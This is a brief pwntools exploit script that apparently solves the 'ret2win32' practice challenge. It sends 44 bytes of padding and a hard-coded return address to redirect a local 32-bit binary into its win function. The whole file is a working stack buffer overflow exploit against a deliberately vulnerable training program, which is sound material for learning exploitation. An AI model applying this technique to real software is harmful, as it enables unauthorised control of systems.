from pwn import *
elf = context.binary = ELF("./ret2win32")
io = process("./ret2win32")

io.recv()

offset=b"A"*44
ret2win= p32(0x0804862c)

io.sendline(offset+ret2win)

io.success(io.recvall())
